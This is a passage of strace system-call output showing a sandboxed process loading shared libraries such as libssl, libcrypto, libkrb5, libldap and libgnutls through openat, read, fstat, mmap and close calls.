24    14:56:49.650307 mmap(0x74b3a7d6a000, 294912, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libssh.so.4.9.6>, 0xe000) = 0x74b3a7d6a000
24    14:56:49.650690 mmap(0x74b3a7db2000, 98304, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libssh.so.4.9.6>, 0x56000) = 0x74b3a7db2000
24    14:56:49.651053 mmap(0x74b3a7dca000, 16384, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libssh.so.4.9.6>, 0x6d000) = 0x74b3a7dca000
24    14:56:49.651405 close(3</usr/lib/x86_64-linux-gnu/libssh.so.4.9.6>) = 0
24    14:56:49.651729 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libpsl.so.5", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libpsl.so.5.3.4>
24    14:56:49.652076 read(3</usr/lib/x86_64-linux-gnu/libpsl.so.5.3.4>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
24    14:56:49.652401 fstat(3</usr/lib/x86_64-linux-gnu/libpsl.so.5.3.4>, {st_mode=S_IFREG|0644, st_size=75768, ...}) = 0
24    14:56:49.652731 mmap(NULL, 77840, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libpsl.so.5.3.4>, 0) = 0x74b3a7d48000
24    14:56:49.653059 mmap(0x74b3a7d4a000, 8192, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libpsl.so.5.3.4>, 0x2000) = 0x74b3a7d4a000
24    14:56:49.653393 mmap(0x74b3a7d4c000, 57344, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libpsl.so.5.3.4>, 0x4000) = 0x74b3a7d4c000
24    14:56:49.653726 mmap(0x74b3a7d5a000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libpsl.so.5.3.4>, 0x11000) = 0x74b3a7d5a000
24    14:56:49.654072 close(3</usr/lib/x86_64-linux-gnu/libpsl.so.5.3.4>) = 0
24    14:56:49.654397 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libssl.so.3", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libssl.so.3>
24    14:56:49.654788 read(3</usr/lib/x86_64-linux-gnu/libssl.so.3>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
24    14:56:49.655116 fstat(3</usr/lib/x86_64-linux-gnu/libssl.so.3>, {st_mode=S_IFREG|0644, st_size=696512, ...}) = 0
24    14:56:49.655443 mmap(NULL, 694384, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libssl.so.3>, 0) = 0x74b3a7c9e000
24    14:56:49.655843 mmap(0x74b3a7cbc000, 401408, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libssl.so.3>, 0x1e000) = 0x74b3a7cbc000
24    14:56:49.656243 mmap(0x74b3a7d1e000, 114688, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libssl.so.3>, 0x80000) = 0x74b3a7d1e000
24    14:56:49.656677 mmap(0x74b3a7d3a000, 57344, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libssl.so.3>, 0x9c000) = 0x74b3a7d3a000
24    14:56:49.657152 close(3</usr/lib/x86_64-linux-gnu/libssl.so.3>) = 0
24    14:56:49.657976 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libcrypto.so.3", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libcrypto.so.3>
24    14:56:49.658646 read(3</usr/lib/x86_64-linux-gnu/libcrypto.so.3>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
24    14:56:49.659234 fstat(3</usr/lib/x86_64-linux-gnu/libcrypto.so.3>, {st_mode=S_IFREG|0644, st_size=5309400, ...}) = 0
24    14:56:49.659836 mmap(NULL, 5323728, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libcrypto.so.3>, 0) = 0x74b3a778a000
24    14:56:49.660401 mmap(0x74b3a783d000, 3358720, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libcrypto.so.3>, 0xb3000) = 0x74b3a783d000
24    14:56:49.660879 mmap(0x74b3a7b71000, 831488, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libcrypto.so.3>, 0x3e7000) = 0x74b3a7b71000
24    14:56:49.661327 mmap(0x74b3a7c3c000, 389120, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libcrypto.so.3>, 0x4b1000) = 0x74b3a7c3c000
24    14:56:49.661759 mmap(0x74b3a7c9b000, 11216, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x74b3a7c9b000
24    14:56:49.662167 close(3</usr/lib/x86_64-linux-gnu/libcrypto.so.3>) = 0
24    14:56:49.662735 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libgssapi_krb5.so.2", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libgssapi_krb5.so.2.2>
24    14:56:49.663176 read(3</usr/lib/x86_64-linux-gnu/libgssapi_krb5.so.2.2>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
24    14:56:49.663582 fstat(3</usr/lib/x86_64-linux-gnu/libgssapi_krb5.so.2.2>, {st_mode=S_IFREG|0644, st_size=338696, ...}) = 0
24    14:56:49.663971 mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x74b3a7788000
24    14:56:49.664360 mmap(NULL, 341080, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libgssapi_krb5.so.2.2>, 0) = 0x74b3a7734000
24    14:56:49.664707 mmap(0x74b3a7740000, 237568, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libgssapi_krb5.so.2.2>, 0xc000) = 0x74b3a7740000
24    14:56:49.665079 mmap(0x74b3a777a000, 40960, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libgssapi_krb5.so.2.2>, 0x46000) = 0x74b3a777a000
24    14:56:49.665444 mmap(0x74b3a7784000, 16384, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libgssapi_krb5.so.2.2>, 0x4f000) = 0x74b3a7784000
24    14:56:49.665891 close(3</usr/lib/x86_64-linux-gnu/libgssapi_krb5.so.2.2>) = 0
24    14:56:49.666263 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libldap.so.2", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libldap.so.2.0.200>
24    14:56:49.666724 read(3</usr/lib/x86_64-linux-gnu/libldap.so.2.0.200>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
24    14:56:49.667131 fstat(3</usr/lib/x86_64-linux-gnu/libldap.so.2.0.200>, {st_mode=S_IFREG|0644, st_size=372400, ...}) = 0
24    14:56:49.667477 mmap(NULL, 383832, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libldap.so.2.0.200>, 0) = 0x74b3a76d6000
24    14:56:49.667829 mmap(0x74b3a76e4000, 245760, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libldap.so.2.0.200>, 0xe000) = 0x74b3a76e4000
24    14:56:49.668173 mmap(0x74b3a7720000, 61440, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libldap.so.2.0.200>, 0x4a000) = 0x74b3a7720000
24    14:56:49.668555 mmap(0x74b3a772f000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libldap.so.2.0.200>, 0x58000) = 0x74b3a772f000
24    14:56:49.668939 mmap(0x74b3a7732000, 7000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x74b3a7732000
24    14:56:49.669303 close(3</usr/lib/x86_64-linux-gnu/libldap.so.2.0.200>) = 0
24    14:56:49.669659 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/liblber.so.2", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/liblber.so.2.0.200>
24    14:56:49.670023 read(3</usr/lib/x86_64-linux-gnu/liblber.so.2.0.200>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
24    14:56:49.670379 fstat(3</usr/lib/x86_64-linux-gnu/liblber.so.2.0.200>, {st_mode=S_IFREG|0644, st_size=59888, ...}) = 0
24    14:56:49.670751 mmap(NULL, 61864, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/liblber.so.2.0.200>, 0) = 0x74b3a76c6000
24    14:56:49.671130 mmap(0x74b3a76c9000, 32768, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/liblber.so.2.0.200>, 0x3000) = 0x74b3a76c9000
24    14:56:49.671509 mmap(0x74b3a76d1000, 12288, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/liblber.so.2.0.200>, 0xb000) = 0x74b3a76d1000
24    14:56:49.671853 mmap(0x74b3a76d4000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/liblber.so.2.0.200>, 0xd000) = 0x74b3a76d4000
24    14:56:49.672211 close(3</usr/lib/x86_64-linux-gnu/liblber.so.2.0.200>) = 0
24    14:56:49.672561 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libzstd.so.1", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libzstd.so.1.5.5>
24    14:56:49.672934 read(3</usr/lib/x86_64-linux-gnu/libzstd.so.1.5.5>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
24    14:56:49.673273 fstat(3</usr/lib/x86_64-linux-gnu/libzstd.so.1.5.5>, {st_mode=S_IFREG|0644, st_size=755864, ...}) = 0
24    14:56:49.673613 mmap(NULL, 757816, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libzstd.so.1.5.5>, 0) = 0x74b3a760c000
24    14:56:49.674022 mmap(0x74b3a7610000, 684032, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libzstd.so.1.5.5>, 0x4000) = 0x74b3a7610000
24    14:56:49.674511 mmap(0x74b3a76b7000, 53248, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libzstd.so.1.5.5>, 0xab000) = 0x74b3a76b7000
24    14:56:49.675027 mmap(0x74b3a76c4000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libzstd.so.1.5.5>, 0xb7000) = 0x74b3a76c4000
24    14:56:49.675429 close(3</usr/lib/x86_64-linux-gnu/libzstd.so.1.5.5>) = 0
24    14:56:49.675793 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libbrotlidec.so.1", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libbrotlidec.so.1.1.0>
24    14:56:49.676165 read(3</usr/lib/x86_64-linux-gnu/libbrotlidec.so.1.1.0>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
24    14:56:49.676504 fstat(3</usr/lib/x86_64-linux-gnu/libbrotlidec.so.1.1.0>, {st_mode=S_IFREG|0644, st_size=51512, ...}) = 0
24    14:56:49.676872 mmap(NULL, 53352, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libbrotlidec.so.1.1.0>, 0) = 0x74b3a75fe000
24    14:56:49.677213 mmap(0x74b3a75ff000, 32768, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libbrotlidec.so.1.1.0>, 0x1000) = 0x74b3a75ff000
24    14:56:49.677560 mmap(0x74b3a7607000, 12288, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libbrotlidec.so.1.1.0>, 0x9000) = 0x74b3a7607000
24    14:56:49.677895 mmap(0x74b3a760a000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libbrotlidec.so.1.1.0>, 0xb000) = 0x74b3a760a000
24    14:56:49.678250 close(3</usr/lib/x86_64-linux-gnu/libbrotlidec.so.1.1.0>) = 0
24    14:56:49.678610 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libunistring.so.5", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libunistring.so.5.0.0>
24    14:56:49.679032 read(3</usr/lib/x86_64-linux-gnu/libunistring.so.5.0.0>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
24    14:56:49.679370 fstat(3</usr/lib/x86_64-linux-gnu/libunistring.so.5.0.0>, {st_mode=S_IFREG|0644, st_size=1755312, ...}) = 0
24    14:56:49.679705 mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x74b3a75fc000
24    14:56:49.680038 mmap(NULL, 1755368, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libunistring.so.5.0.0>, 0) = 0x74b3a744f000
24    14:56:49.680428 mmap(0x74b3a7460000, 225280, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libunistring.so.5.0.0>, 0x11000) = 0x74b3a7460000
24    14:56:49.680882 mmap(0x74b3a7497000, 1441792, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libunistring.so.5.0.0>, 0x48000) = 0x74b3a7497000
24    14:56:49.681311 mmap(0x74b3a75f7000, 20480, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libunistring.so.5.0.0>, 0x1a8000) = 0x74b3a75f7000
24    14:56:49.681723 close(3</usr/lib/x86_64-linux-gnu/libunistring.so.5.0.0>) = 0
24    14:56:49.682121 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libgnutls.so.30", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libgnutls.so.30.37.1>
24    14:56:49.682545 read(3</usr/lib/x86_64-linux-gnu/libgnutls.so.30.37.1>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
24    14:56:49.682995 fstat(3</usr/lib/x86_64-linux-gnu/libgnutls.so.30.37.1>, {st_mode=S_IFREG|0644, st_size=2065824, ...}) = 0
24    14:56:49.683344 mmap(NULL, 2075936, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libgnutls.so.30.37.1>, 0) = 0x74b3a7254000
24    14:56:49.683682 mmap(0x74b3a7287000, 1286144, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libgnutls.so.30.37.1>, 0x33000) = 0x74b3a7287000
24    14:56:49.684026 mmap(0x74b3a73c1000, 495616, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libgnutls.so.30.37.1>, 0x16d000) = 0x74b3a73c1000
24    14:56:49.684365 mmap(0x74b3a743a000, 73728, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libgnutls.so.30.37.1>, 0x1e6000) = 0x74b3a743a000
24    14:56:49.684713 mmap(0x74b3a744c000, 11552, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x74b3a744c000
24    14:56:49.685086 close(3</usr/lib/x86_64-linux-gnu/libgnutls.so.30.37.1>) = 0
24    14:56:49.685430 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libhogweed.so.6", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libhogweed.so.6.8>
24    14:56:49.685799 read(3</usr/lib/x86_64-linux-gnu/libhogweed.so.6.8>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
24    14:56:49.686135 fstat(3</usr/lib/x86_64-linux-gnu/libhogweed.so.6.8>, {st_mode=S_IFREG|0644, st_size=288920, ...}) = 0
24    14:56:49.686474 mmap(NULL, 290832, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libhogweed.so.6.8>, 0) = 0x74b3a720c000
24    14:56:49.686915 mmap(0x74b3a7214000, 81920, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libhogweed.so.6.8>, 0x8000) = 0x74b3a7214000
24    14:56:49.687276 mmap(0x74b3a7228000, 167936, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libhogweed.so.6.8>, 0x1c000) = 0x74b3a7228000
24    14:56:49.687615 mmap(0x74b3a7251000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libhogweed.so.6.8>, 0x44000) = 0x74b3a7251000
24    14:56:49.687970 close(3</usr/lib/x86_64-linux-gnu/libhogweed.so.6.8>) = 0
24    14:56:49.688320 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libnettle.so.8", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libnettle.so.8.8>
24    14:56:49.688781 read(3</usr/lib/x86_64-linux-gnu/libnettle.so.8.8>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
24    14:56:49.689143 fstat(3</usr/lib/x86_64-linux-gnu/libnettle.so.8.8>, {st_mode=S_IFREG|0644, st_size=342280, ...}) = 0
24    14:56:49.689483 mmap(NULL, 344192, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libnettle.so.8.8>, 0) = 0x74b3a71b7000
24    14:56:49.689822 mmap(0x74b3a71c3000, 192512, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libnettle.so.8.8>, 0xc000) = 0x74b3a71c3000
24    14:56:49.690165 mmap(0x74b3a71f2000, 94208, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libnettle.so.8.8>, 0x3b000) = 0x74b3a71f2000
24    14:56:49.690508 mmap(0x74b3a7209000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libnettle.so.8.8>, 0x51000) = 0x74b3a7209000
24    14:56:49.691246 close(3</usr/lib/x86_64-linux-gnu/libnettle.so.8.8>) = 0
24    14:56:49.691829 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libgmp.so.10", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libgmp.so.10.5.0>
24    14:56:49.692404 read(3</usr/lib/x86_64-linux-gnu/libgmp.so.10.5.0>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
24    14:56:49.692913 fstat(3</usr/lib/x86_64-linux-gnu/libgmp.so.10.5.0>, {st_mode=S_IFREG|0644, st_size=534896, ...}) = 0
24    14:56:49.693344 mmap(NULL, 537072, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libgmp.so.10.5.0>, 0) = 0x74b3a7133000
24    14:56:49.693713 mmap(0x74b3a713d000, 405504, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libgmp.so.10.5.0>, 0xa000) = 0x74b3a713d000
24    14:56:49.694078 mmap(0x74b3a71a0000, 86016, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libgmp.so.10.5.0>, 0x6d000) = 0x74b3a71a0000
24    14:56:49.694436 mmap(0x74b3a71b5000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libgmp.so.10.5.0>, 0x81000) = 0x74b3a71b5000
24    14:56:49.694902 close(3</usr/lib/x86_64-linux-gnu/libgmp.so.10.5.0>) = 0
24    14:56:49.695314 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libkrb5.so.3", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libkrb5.so.3.3>
24    14:56:49.695686 read(3</usr/lib/x86_64-linux-gnu/libkrb5.so.3.3>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
24    14:56:49.696020 fstat(3</usr/lib/x86_64-linux-gnu/libkrb5.so.3.3>, {st_mode=S_IFREG|0644, st_size=823488, ...}) = 0
24    14:56:49.696354 mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x74b3a7131000
24    14:56:49.696721 mmap(NULL, 822032, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libkrb5.so.3.3>, 0) = 0x74b3a7068000
24    14:56:49.697091 mmap(0x74b3a7088000, 397312, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libkrb5.so.3.3>, 0x20000) = 0x74b3a7088000
24    14:56:49.697479 mmap(0x74b3a70e9000, 233472, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libkrb5.so.3.3>, 0x81000) = 0x74b3a70e9000
24    14:56:49.697858 mmap(0x74b3a7122000, 61440, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libkrb5.so.3.3>, 0xba000) = 0x74b3a7122000
24    14:56:49.698250 close(3</usr/lib/x86_64-linux-gnu/libkrb5.so.3.3>) = 0
24    14:56:49.698648 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libk5crypto.so.3", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libk5crypto.so.3.1>
24    14:56:49.699083 read(3</usr/lib/x86_64-linux-gnu/libk5crypto.so.3.1>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
24    14:56:49.699450 fstat(3</usr/lib/x86_64-linux-gnu/libk5crypto.so.3.1>, {st_mode=S_IFREG|0644, st_size=178648, ...}) = 0
24    14:56:49.699784 mmap(NULL, 176392, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libk5crypto.so.3.1>, 0) = 0x74b3a703c000
24    14:56:49.700119 mmap(0x74b3a7040000, 110592, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libk5crypto.so.3.1>, 0x4000) = 0x74b3a7040000
24    14:56:49.700478 mmap(0x74b3a705b000, 45056, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libk5crypto.so.3.1>, 0x1f000) = 0x74b3a705b000
24    14:56:49.700813 mmap(0x74b3a7066000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libk5crypto.so.3.1>, 0x2a000) = 0x74b3a7066000
24    14:56:49.701163 close(3</usr/lib/x86_64-linux-gnu/libk5crypto.so.3.1>) = 0
24    14:56:49.701517 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libcom_err.so.2", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libcom_err.so.2.1>
24    14:56:49.701903 read(3</usr/lib/x86_64-linux-gnu/libcom_err.so.2.1>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
24    14:56:49.702249 fstat(3</usr/lib/x86_64-linux-gnu/libcom_err.so.2.1>, {st_mode=S_IFREG|0644, st_size=18504, ...}) = 0
24    14:56:49.702651 mmap(NULL, 20552, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libcom_err.so.2.1>, 0) = 0x74b3a7036000
24    14:56:49.703033 mmap(0x74b3a7038000, 4096, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libcom_err.so.2.1>, 0x2000) = 0x74b3a7038000
24    14:56:49.703401 mmap(0x74b3a7039000, 4096, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libcom_err.so.2.1>, 0x3000) = 0x74b3a7039000
24    14:56:49.703744 mmap(0x74b3a703a000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libcom_err.so.2.1>, 0x3000) = 0x74b3a703a000
24    14:56:49.704113 close(3</usr/lib/x86_64-linux-gnu/libcom_err.so.2.1>) = 0
24    14:56:49.704506 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libkrb5support.so.0", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libkrb5support.so.0.1>
24    14:56:49.704951 read(3</usr/lib/x86_64-linux-gnu/libkrb5support.so.0.1>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
24    14:56:49.705325 fstat(3</usr/lib/x86_64-linux-gnu/libkrb5support.so.0.1>, {st_mode=S_IFREG|0644, st_size=47904, ...}) = 0
24    14:56:49.705677 mmap(NULL, 50128, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libkrb5support.so.0.1>, 0) = 0x74b3a7029000
